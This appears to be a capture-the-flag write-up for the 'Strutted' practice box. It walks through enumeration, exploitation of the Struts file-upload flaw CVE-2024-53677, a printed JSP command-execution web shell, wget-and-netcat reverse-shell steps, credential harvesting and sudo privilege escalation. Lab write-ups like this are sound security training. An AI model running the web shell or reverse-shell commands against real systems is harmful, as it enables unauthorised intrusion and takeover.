---
tags:
  - CTF
  - Medium
---
# Box: Strutted
## Enumeration
### nmap:
```
❯ nmap -sV -sC 10.10.11.59
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-16 11:05 CET
Nmap scan report for 10.10.11.59
Host is up (0.68s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://strutted.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 665.92 seconds
```
### ffuf
```
Directories

❯ ffuf -u "http://strutted.htb/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -fs 5197

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://strutted.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 5197
________________________________________________

about                   [Status: 200, Size: 6610, Words: 2173, Lines: 182, Duration: 250ms]
download                [Status: 200, Size: 39680602, Words: 0, Lines: 0, Duration: 0ms]
how                     [Status: 200, Size: 6119, Words: 2054, Lines: 182, Duration: 197ms]
```

Install the source code (click the `Download` button in top right) and start searching...

We look at dependencies in `pom.xml` file and we find this:
```
            <struts2.version>6.3.0.1</struts2.version>

            <dependency>
                <groupId>org.apache.struts</groupId>
                <artifactId>struts2-core</artifactId>
                <version>${struts2.version}</version>
            </dependency>
             
```
## Exploitation
### CVE-2024-53677
So we can check for vulnerabilities
and we find this: `https://github.com/EQSTLab/CVE-2024-53677`

Follow the instructions...

SPOILER: It doesnt work. (at least for me)

I started using burp suite.

Post random png file, capture it with burp and then you can remove most of the PNG content so you wont have to scroll so much.

Then i did this:
### Burp Suite
1. Change name="upload' to name="Upload"
![1](/images/strutted/1.png)
2. Copy the code below and paste it below the PNG content
```
<%@ page import="java.util.*,java.io.*"%>
<%
//
// JSP_KIT
//
// cmd.jsp = Command Execution (unix)
//
// by: Unknown
// modified: 27/06/2003
//
%>
<HTML><BODY>
<FORM METHOD="GET" NAME="myform" ACTION="">
<INPUT TYPE="text" NAME="cmd">
<INPUT TYPE="submit" VALUE="Send">
</FORM>
<pre>
<%
if (request.getParameter("cmd") != null) {
        out.println("Command: " + request.getParameter("cmd") + "<BR>");
        Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
        OutputStream os = p.getOutputStream();
        InputStream in = p.getInputStream();
        DataInputStream dis = new DataInputStream(in);
        String disr = dis.readLine();
        while ( disr != null ) {
                out.println(disr); 
                disr = dis.readLine(); 
                }
        }
%>
</pre>
</BODY></HTML>
```
### Web Shell
![2](/images/strutted/2.png)
3. Then you should see that it worked, just as in the picture:
![3](/images/strutted/3.png)
4. Go to the `http://strutted.htb/cmd.jsp` and you should see this:
![4](/images/strutted/4.png)
### Reverse Shell
5. Create reverse shell
If you see the website thats a good sign, now create reverse shell, change the ip and port to yours

![5](/images/strutted/5.png)

Upload the file with python web server (python3 -m http.server), and download it on the site with `wget http://yourip:port/shellname.sh -O /tmp/shellname.sh`, set up netcat (nc -lvnp 2115) then execute reverse shell with `bash /tmp/shellname.sh`
![6](/images/strutted/6.png)
7. Start searching for something that can help us, I found file with password (/conf/tomcat-users.xml)
![7](/images/strutted/7.png)
We check `/etc/passwd` and we see user `james` 
![8](/images/strutted/8.png)
### SSH
We can try to ssh in.
![9](/images/strutted/9.png)
## Privilege Escalation
8. We got user flag, so now we need to escalate our privileges, if we use `sudo -l` we see this:
![10](/images/strutted/10.png)
We can go to GTFOBins to search what we can do with that information
![11](/images/strutted/11.png)
9. Follow the instructions and you should get your privileges escalated
![12](/images/strutted/12.png)
![13](/images/strutted/13.png)
GG. 